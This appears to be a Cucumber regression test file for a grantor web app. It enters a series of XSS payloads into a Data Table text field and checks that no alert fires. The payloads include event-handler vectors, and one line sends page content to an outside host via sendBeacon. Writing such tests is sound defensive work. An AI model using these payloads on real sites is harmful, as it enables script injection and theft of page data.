@US-296453 @regression-PATCH @Sprint-5-Year-2023 @Year-2023 @US-296453_2
Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
  Text Field of Data Table Enhanced, few script has to handle.
  Need to handle same scenario in PDF for CKEditor, Data Table and Data Table Enhanced. (Suite ID: 304363)

    ################## Data Type - Text Field- Vrushali ###################
  @300625 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                           | Field                |
      | <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style="position:absolute;" onanimationcancel="print()"></xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300629 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                       | Field                |
      | <style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300634 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                            | Field                |
      | <style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300635 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                         | Field                |
      | <style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300639 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                               | Field                |
      | <body onbeforeprint=console.log(1)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300640 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                  | Field                |
      | <xss onbeforescriptexecute=alert(1)><script>1</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300644 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                     | Field                |
      | <body onbeforeunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300646 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                  | Field                |
      | <svg><animate onbegin=alert(1) attributeName=x dur=1s> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300648 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                   | Field                |
      | <marquee width=1 loop=1 onbounce=alert(1)>XSS</marquee> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300652 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                            | Field                |
      | <audio oncanplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300659 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                   | Field                |
      | <video oncanplaythrough=alert(1)><source src="validvideo.mp4" type="video/mp4"></video> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300662 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value             | Field                |
      | {testData:script} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300664 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                         | Field                |
      | <audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300665 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                | Field                |
      | <svg><animate onend=alert(1) attributeName=x dur=1s> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300666 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                            | Field                |
      | <audio controls autoplay onended=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300667 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                        | Field                |
      | <audio src/onerror=alert(1)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300668 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                   | Field                |
      | <marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
